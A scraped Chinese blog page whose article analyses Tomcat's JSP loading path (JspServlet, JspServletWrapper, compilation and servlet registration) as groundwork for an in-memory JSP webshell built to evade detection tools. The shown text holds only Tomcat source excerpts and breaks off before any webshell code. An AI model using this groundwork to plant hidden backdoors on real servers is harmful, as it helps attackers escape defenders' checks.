0,selfDescription:"网络安全使者，学习网络安全技术",beLikedCount:210,beReadCount:106140,followerCount:56,followingCount:d,collectionCount:d,createdCollectionCount:d,followingCollectionCount:d,postedPostsCount:366,pinCount:d,likedArticleCount:15,likedPinCount:d,avatar:"https:\u002F\u002Fp3-passport.byteacctimg.com\u002Fimg\u002Fuser-avatar\u002F5b4fe90aaf79de49689ec22ea8e27561~300x300.image",latestLoginedInAt:c,createdAt:c,updatedAt:c,phoneNumber:e,titleDescription:e,followeesCount:d,applyEventCount:d,need_lead:d,followTopicCnt:void 0},adEntryList:[],relatedEntryList:[],linkVotingList:[],userAnnuals:[],columnList:[],cachedHtml:"\u003Cstyle\u003E.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;margin-bottom:5px}.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{font-size:20px}.markdown-body h2{padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre\u003Ecode{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:\"\"}.markdown-body blockquote\u003Ep{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}\u003C\u002Fstyle\u003E\u003Ch2 data-id=\"heading-0\"\u003E\u003Cimg src=\"https:\u002F\u002Fp3-juejin.byteimg.com\u002Ftos-cn-i-k3u1fbpfcp\u002F8e050c964e6f47938121ce8f3cd5039c~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image\" alt=\"\" loading=\"lazy\"\u003E\u003C\u002Fh2\u003E\n\u003Ch2 data-id=\"heading-1\"\u003E前言\u003C\u002Fh2\u003E\n\u003Cp\u003E最近在研究webshell免杀的问题，到了内存马免杀部分发现传统的Filter或者Servlet查杀手段比较多，不太容易实现免杀，比如有些工具会将所有注册的\u003Ccode\u003EServlet\u003C\u002Fcode\u003E和\u003Ccode\u003EFilter\u003C\u002Fcode\u003E拿出来，排查人员仔细一点还是会被查出来的，所以\u003Cbr\u003E\n\u003Cstrong\u003E我们要找一些其他方式实现的内存马。比如我今天提到的JSP的内存马（虽然本质上也是一种Servlet类型的马）\u003C\u002Fstrong\u003E  。\u003C\u002Fp\u003E\n\u003Ch2 data-id=\"heading-2\"\u003E\u003Ca href=\"https:\u002F\u002Flink.juejin.cn?target=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fdocs.qq.com%252Fdoc%252FDVFNpaGJvRFJiQ2Ro\" target=\"_blank\" rel=\"nofollow noopener noreferrer\" title=\"https:\u002F\u002Fwww.oschina.net\u002Faction\u002FGoToLink?url=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDVFNpaGJvRFJiQ2Ro\" ref=\"nofollow noopener noreferrer\"\u003E【学习资料】\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Ch2 data-id=\"heading-3\"\u003EJSP加载流程分析\u003C\u002Fh2\u003E\n\u003Cp\u003E在Tomcat中\u003Ccode\u003Ejsp\u003C\u002Fcode\u003E和\u003Ccode\u003Ejspx\u003C\u002Fcode\u003E都会交给\u003Ccode\u003EJspServlet\u003C\u002Fcode\u003E处理，所以要想实现\u003Ccode\u003EJSP\u003C\u002Fcode\u003E驻留内存，首先得分析\u003Ccode\u003EJspServlet\u003C\u002Fcode\u003E的处理逻辑。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-xml copyable\" lang=\"xml\"\u003E\u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u003Cspan class=\"hljs-name\"\u003Eservlet\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\n        \u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u003Cspan class=\"hljs-name\"\u003Eservlet-name\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003Ejsp\u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u002F\u003Cspan class=\"hljs-name\"\u003Eservlet-name\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\n        \u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u003Cspan class=\"hljs-name\"\u003Eservlet-class\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003Eorg.apache.jasper.servlet.JspServlet\u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u002F\u003Cspan class=\"hljs-name\"\u003Eservlet-class\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\n    ...\n    \u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u002F\u003Cspan class=\"hljs-name\"\u003Eservlet\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\n...\n\u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u003Cspan class=\"hljs-name\"\u003Eservlet-mapping\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\n        \u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u003Cspan class=\"hljs-name\"\u003Eservlet-name\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003Ejsp\u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u002F\u003Cspan class=\"hljs-name\"\u003Eservlet-name\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\n        \u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u003Cspan class=\"hljs-name\"\u003Eurl-pattern\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E*.jsp\u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u002F\u003Cspan class=\"hljs-name\"\u003Eurl-pattern\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\n        \u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u003Cspan class=\"hljs-name\"\u003Eurl-pattern\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E*.jspx\u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u002F\u003Cspan class=\"hljs-name\"\u003Eurl-pattern\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\n    \u003Cspan class=\"hljs-tag\"\u003E&#x3C;\u002F\u003Cspan class=\"hljs-name\"\u003Eservlet-mapping\u003C\u002Fspan\u003E\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E下面分析\u003Ccode\u003EJspServlet#service\u003C\u002Fcode\u003E方法，主要的功能是接收请求的URL，判断是否预编译，核心的方法是\u003Ccode\u003EserviceJspFile\u003C\u002Fcode\u003E。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-ini copyable\" lang=\"ini\"\u003Epublic void service (HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String \u003Cspan class=\"hljs-attr\"\u003EjspUri\u003C\u002Fspan\u003E = jspFile\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n            \u003Cspan class=\"hljs-attr\"\u003EjspUri\u003C\u002Fspan\u003E = (String) request.getAttribute(\n                    RequestDispatcher.INCLUDE_SERVLET_PATH)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n            if (jspUri != null) {\n      \u002F\u002F检查请求是否是通过其他Servlet转发过来的\n                String \u003Cspan class=\"hljs-attr\"\u003EpathInfo\u003C\u002Fspan\u003E = (String) request.getAttribute(\n                        RequestDispatcher.INCLUDE_PATH_INFO)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                if (pathInfo != null) {\n                    jspUri += pathInfo\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                }\n            } else {\n       \u002F\u002F获取ServletPath和pathInfo作为jspUri\n                \u003Cspan class=\"hljs-attr\"\u003EjspUri\u003C\u002Fspan\u003E = request.getServletPath()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                String \u003Cspan class=\"hljs-attr\"\u003EpathInfo\u003C\u002Fspan\u003E = request.getPathInfo()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                if (pathInfo != null) {\n                    jspUri += pathInfo\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                }\n            }\n        }\n        try {\n            \u002F\u002F是否预编译\n            boolean \u003Cspan class=\"hljs-attr\"\u003Eprecompile\u003C\u002Fspan\u003E = preCompile(request)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n            \u002F\u002F核心方法\n            serviceJspFile(request, response, jspUri, precompile)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n        } catch (RuntimeException | IOException | ServletException e) {\n            throw e\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n        } catch (Throwable e) {\n            ExceptionUtils.handleThrowable(e)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n            throw new ServletException(e)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n        }\n    }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ccode\u003EpreCompile\u003C\u002Fcode\u003E中只有当请求参数以\u003Ccode\u003Ejsp_precompile\u003C\u002Fcode\u003E开始才会进行预编译，否则不进行预编译。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-java copyable\" lang=\"java\"\u003E\u003Cspan class=\"hljs-type\"\u003Eboolean\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title function_\"\u003EpreCompile\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-params\"\u003E(HttpServletRequest request)\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-keyword\"\u003Ethrows\u003C\u002Fspan\u003E ServletException {\n        \u003Cspan class=\"hljs-type\"\u003EString\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-variable\"\u003EqueryString\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-operator\"\u003E=\u003C\u002Fspan\u003E request.getQueryString();\n        \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (queryString == \u003Cspan class=\"hljs-literal\"\u003Enull\u003C\u002Fspan\u003E) {\n            \u003Cspan class=\"hljs-keyword\"\u003Ereturn\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-literal\"\u003Efalse\u003C\u002Fspan\u003E;\n        }\n        \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F    public static final String PRECOMPILE = System.getProperty(\"org.apache.jasper.Constants.PRECOMPILE\", \"jsp_precompile\");\u003C\u002Fspan\u003E\n        \u003Cspan class=\"hljs-type\"\u003Eint\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-variable\"\u003Estart\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-operator\"\u003E=\u003C\u002Fspan\u003E queryString.indexOf(Constants.PRECOMPILE);\n        \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (start &#x3C; \u003Cspan class=\"hljs-number\"\u003E0\u003C\u002Fspan\u003E) {\n            \u003Cspan class=\"hljs-keyword\"\u003Ereturn\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-literal\"\u003Efalse\u003C\u002Fspan\u003E;\n        }\n        queryString =\n            queryString.substring(start + Constants.PRECOMPILE.length());\n        \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (queryString.length() == \u003Cspan class=\"hljs-number\"\u003E0\u003C\u002Fspan\u003E) {\n            \u003Cspan class=\"hljs-keyword\"\u003Ereturn\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-literal\"\u003Etrue\u003C\u002Fspan\u003E;             \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F ?jsp_precompile\u003C\u002Fspan\u003E\n        }\n        \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (queryString.startsWith(\u003Cspan class=\"hljs-string\"\u003E\"&#x26;\"\u003C\u002Fspan\u003E)) {\n            \u003Cspan class=\"hljs-keyword\"\u003Ereturn\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-literal\"\u003Etrue\u003C\u002Fspan\u003E;             \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F ?jsp_precompile&#x26;foo=bar...\u003C\u002Fspan\u003E\n        }\n        \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (!queryString.startsWith(\u003Cspan class=\"hljs-string\"\u003E\"=\"\u003C\u002Fspan\u003E)) {\n            \u003Cspan class=\"hljs-keyword\"\u003Ereturn\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-literal\"\u003Efalse\u003C\u002Fspan\u003E;            \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F part of some other name or value\u003C\u002Fspan\u003E\n        }\n       ...\n    }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E那么预编译的作用是什么？当进行预编译后会怎么样？答案在\u003Ccode\u003EJspServletWrapper#service\u003C\u002Fcode\u003E中，当预编译后，请求便不会调用对应JSP的servlet的service方法进行处理，所以要想让我们的JSP能正常使用，当然是不要预编译的，默认情况下也不会预编译。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-java copyable\" lang=\"java\"\u003E\u003Cspan class=\"hljs-keyword\"\u003Epublic\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-keyword\"\u003Evoid\u003C\u002Fspan\u003E \u003Cspan class=\"hljs-title function_\"\u003Eservice\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-params\"\u003E(HttpServletRequest request,\n                        HttpServletResponse response,\n                        \u003Cspan class=\"hljs-type\"\u003Eboolean\u003C\u002Fspan\u003E precompile)\u003C\u002Fspan\u003E\n            \u003Cspan class=\"hljs-keyword\"\u003Ethrows\u003C\u002Fspan\u003E ServletException, IOException, FileNotFoundException {\n        Servlet servlet;\n      ...\n\n            \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F If a page is to be precompiled only, return.\u003C\u002Fspan\u003E\n            \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (precompile) {\n                \u003Cspan class=\"hljs-keyword\"\u003Ereturn\u003C\u002Fspan\u003E;\n     ...\n            \u003Cspan class=\"hljs-comment\"\u003E\u002F*\n             * (4) Service request\n             *\u002F\u003C\u002Fspan\u003E\n            \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (servlet \u003Cspan class=\"hljs-keyword\"\u003Einstanceof\u003C\u002Fspan\u003E SingleThreadModel) {\n               \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F sync on the wrapper so that the freshness\u003C\u002Fspan\u003E\n               \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F of the page is determined right before servicing\u003C\u002Fspan\u003E\n               \u003Cspan class=\"hljs-keyword\"\u003Esynchronized\u003C\u002Fspan\u003E (\u003Cspan class=\"hljs-built_in\"\u003Ethis\u003C\u002Fspan\u003E) {\n                   ``.service(request, response);\n                }\n            } \u003Cspan class=\"hljs-keyword\"\u003Eelse\u003C\u002Fspan\u003E {\n                servlet.service(request, response);\n            }\n      ...\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E下面再来看\u003Ccode\u003EserviceJspFile\u003C\u002Fcode\u003E方法，该方法判断JSP是否已经被注册为一个Servlet，不存在则创建JspServletWrapper并put到\u003Ccode\u003EJspRuntimeContext\u003C\u002Fcode\u003E中，\u003Ccode\u003EJspServletWrapper.service\u003C\u002Fcode\u003E是核心方法。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-scss copyable\" lang=\"scss\"\u003Eprivate void \u003Cspan class=\"hljs-built_in\"\u003EserviceJspFile\u003C\u002Fspan\u003E(HttpServletRequest request,\n                                HttpServletResponse response, String jspUri,\n                                boolean precompile)\n        throws ServletException, IOException {\n\u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F  首先判断JSP是否已经被注册为一个Servlet，ServletWrapper是Servlet的包装类，所有注册的JSP servlet都会被保存在JspRuntimeContext的jsps属性中，如果我们第一次请求这个JSP，当然是找不到wrapper的。\u003C\u002Fspan\u003E\n        JspServletWrapper wrapper = rctxt\u003Cspan class=\"hljs-selector-class\"\u003E.getWrapper\u003C\u002Fspan\u003E(jspUri);\n        if (wrapper == null) {\n            \u003Cspan class=\"hljs-built_in\"\u003Esynchronized\u003C\u002Fspan\u003E(this) {\n                wrapper = rctxt\u003Cspan class=\"hljs-selector-class\"\u003E.getWrapper\u003C\u002Fspan\u003E(jspUri);\n                if (wrapper == null) {\n                 \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F检查JSP文件是否存在\u003C\u002Fspan\u003E\n                    if (null == context.getResource(jspUri)) {\n                        \u003Cspan class=\"hljs-built_in\"\u003EhandleMissingResource\u003C\u002Fspan\u003E(request, response, jspUri);\n                        return;\n                    }\n                    \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F创建JspServletWrapper\u003C\u002Fspan\u003E\n                    wrapper = new \u003Cspan class=\"hljs-built_in\"\u003EJspServletWrapper\u003C\u002Fspan\u003E(config, options, jspUri,\n                                                 rctxt);\n                    \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F添加wrapper到JspRuntimeContext的jsps属性中\u003C\u002Fspan\u003E\n                    rctxt\u003Cspan class=\"hljs-selector-class\"\u003E.addWrapper\u003C\u002Fspan\u003E(jspUri,wrapper);\n                }\n            }\n        }\n        try {\n            \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F核心方法\u003C\u002Fspan\u003E\n            wrapper\u003Cspan class=\"hljs-selector-class\"\u003E.service\u003C\u002Fspan\u003E(request, response, precompile);\n        } catch (FileNotFoundException fnfe) {\n            \u003Cspan class=\"hljs-built_in\"\u003EhandleMissingResource\u003C\u002Fspan\u003E(request, response, jspUri);\n        }\n    }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E\u003Ccode\u003EJspServletWrapper.service\u003C\u002Fcode\u003E主要做了如下操作。\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003E\n\u003Cp\u003E根据jsp生成java文件并编译为class\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\n\u003Cp\u003E将class文件注册为servlet\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003Cli\u003E\n\u003Cp\u003E调用\u003Ccode\u003Eservlet.service\u003C\u002Fcode\u003E方法完成调用\u003C\u002Fp\u003E\n\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003EJSP生成java和class文件主要由下面的代码完成，这里的\u003Ccode\u003Eoptions.getDevelopment()\u003C\u002Fcode\u003E代表的是部署模式。\u003C\u002Fp\u003E\n\u003Cp\u003Etomcat的开发模式和生产模式的设定是通过conf文件夹下面的web.xml文件来配置的。\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003E在开发模式下，容器会经常检查jsp文件的时间戳来决定是否进行编译，如果jsp文件的时间戳比对应的.class文件的时间戳晚就证明jsp又进行了修改，需要再次编译，但是不断地进行时间戳的比对开销很大，会影响系统性能，而在生产模式下系统不会经常想的检查时间戳。所以一般在开发过程中使用开发模式，这样可以在jsp修改后再次访问就可以见到修改后的效果非常方便，而系统上线之后就要改为生产模式，虽然生产模式下会导致jsp的修改需要重启服务器才可以生效，但是上线后的改动较少而且性能很重要。\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Cp\u003E默认Tomcat是以开发模式运行的。一般我们遇到的Tomcat都是以开发模式运行的，所以会由\u003Ccode\u003EJspCompilationContext#compile\u003C\u002Fcode\u003E进行编译。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-java copyable\" lang=\"java\"\u003E\u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (options.getDevelopment() || mustCompile) {\n                \u003Cspan class=\"hljs-keyword\"\u003Esynchronized\u003C\u002Fspan\u003E (\u003Cspan class=\"hljs-built_in\"\u003Ethis\u003C\u002Fspan\u003E) {\n                    \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (options.getDevelopment() || mustCompile) {\n                        ctxt.compile();\n                        mustCompile = \u003Cspan class=\"hljs-literal\"\u003Efalse\u003C\u002Fspan\u003E;\n                    }\n                }\n            } \u003Cspan class=\"hljs-keyword\"\u003Eelse\u003C\u002Fspan\u003E {\n                \u003Cspan class=\"hljs-keyword\"\u003Eif\u003C\u002Fspan\u003E (compileException != \u003Cspan class=\"hljs-literal\"\u003Enull\u003C\u002Fspan\u003E) {\n                    \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F Throw cached compilation exception\u003C\u002Fspan\u003E\n                    \u003Cspan class=\"hljs-keyword\"\u003Ethrow\u003C\u002Fspan\u003E compileException;\n                }\n            }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E下面我们看下编译部分都做了什么，Tomcat默认使用\u003Ccode\u003EJDTCompiler\u003C\u002Fcode\u003E编译，首先通过\u003Ccode\u003EisOutDated\u003C\u002Fcode\u003E判断是否需要编译，再去检查JSP文件是否存在，删除原有的java和Class文件，通过\u003Ccode\u003EjspCompiler.compile()\u003C\u002Fcode\u003E编译。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-scss copyable\" lang=\"scss\"\u003Epublic void \u003Cspan class=\"hljs-built_in\"\u003Ecompile\u003C\u002Fspan\u003E() throws JasperException, FileNotFoundException {\n      \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F获取编译器，默认使用JDTCompiler编译\u003C\u002Fspan\u003E\n        \u003Cspan class=\"hljs-built_in\"\u003EcreateCompiler\u003C\u002Fspan\u003E();\n      \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F通过isOutDated决定是否编译\u003C\u002Fspan\u003E\n        if (jspCompiler.isOutDated()) {\n            if (isRemoved()) {\n                throw new \u003Cspan class=\"hljs-built_in\"\u003EFileNotFoundException\u003C\u002Fspan\u003E(jspUri);\n            }\n            try {\n                \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F删除已经生成的java和Class文件\u003C\u002Fspan\u003E\n                jspCompiler\u003Cspan class=\"hljs-selector-class\"\u003E.removeGeneratedFiles\u003C\u002Fspan\u003E();\n                jspLoader = null;\n                \u003Cspan class=\"hljs-comment\"\u003E\u002F\u002F编译\u003C\u002Fspan\u003E\n                jspCompiler\u003Cspan class=\"hljs-selector-class\"\u003E.compile\u003C\u002Fspan\u003E();\n                jsw\u003Cspan class=\"hljs-selector-class\"\u003E.setReload\u003C\u002Fspan\u003E(true);\n                jsw\u003Cspan class=\"hljs-selector-class\"\u003E.setCompilationException\u003C\u002Fspan\u003E(null);\n            ...\n    }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E下面我们分析如何将生成的class文件注册为Servlet。首先判断\u003Ccode\u003EtheServlet\u003C\u002Fcode\u003E是否为空，如果为空则表示还没有为JSP文件创建过Servlet，则通过\u003Ccode\u003EInstanceManager.newInstance\u003C\u002Fcode\u003E创建Servlet,并将创建的Servlet保存在\u003Ccode\u003EtheServlet\u003C\u002Fcode\u003E属性中。\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"hljs language-ini copyable\" lang=\"ini\"\u003Epublic Servlet getServlet() throws ServletException {\n\u002F\u002F getReloadInternal是否Reload默认为False，也就是说如果theServlet为true就会直接返回。\n        if (getReloadInternal() || \u003Cspan class=\"hljs-attr\"\u003EtheServlet\u003C\u002Fspan\u003E == null) {\n            synchronized (this) {\n\n                if (getReloadInternal() || \u003Cspan class=\"hljs-attr\"\u003EtheServlet\u003C\u002Fspan\u003E == null) {\n             \u002F\u002F如果theServlet中有值则销毁该Servlet.\n                    destroy()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                    final Servlet servlet\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                    try {\n                        \u002F\u002F创建Servlet实例\n                        InstanceManager \u003Cspan class=\"hljs-attr\"\u003EinstanceManager\u003C\u002Fspan\u003E = InstanceManagerFactory.getInstanceManager(config)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                        \u003Cspan class=\"hljs-attr\"\u003Eservlet\u003C\u002Fspan\u003E = (Servlet) instanceManager.newInstance(ctxt.getFQCN(), ctxt.getJspLoader())\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                    } catch (Exception e) {\n                        Throwable \u003Cspan class=\"hljs-attr\"\u003Et\u003C\u002Fspan\u003E = ExceptionUtils\n                                .unwrapInvocationTargetException(e)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                        ExceptionUtils.handleThrowable(t)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                        throw new JasperException(t)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                    }\n                \u002F\u002F初始化servlet\n                    servlet.init(config)\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                    if (theServlet != null) {\n                        ctxt.getRuntimeContext().incrementJspReloadCount()\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                    }\n                \u002F\u002F将servlet保存到theServlet中，theServlet由volatile修饰，在线程之间可以共享。\n                    \u003Cspan class=\"hljs-attr\"\u003EtheServlet\u003C\u002Fspan\u003E = servlet\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                    \u003Cspan class=\"hljs-attr\"\u003Ereload\u003C\u002Fspan\u003E = \u003Cspan class=\"hljs-literal\"\u003Efalse\u003C\u002Fspan\u003E\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n                }\n            }\n        }\n        return theServlet\u003Cspan class=\"hljs-comment\"\u003E;\u003C\u002Fspan\u003E\n    }\n\u003Cspan class=\"copy-code-btn\"\u003E复制代码\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003E下面有一个小知识点，\u003Ccode\u003EtheServlet\u003C\u002Fcode\u003E是由\u003Ccode\u003Evolatile\u003C\u002Fcode\u003E修饰的，在不同的线程之间可以共享，再通过\u003Ccode\u003Esynchronized 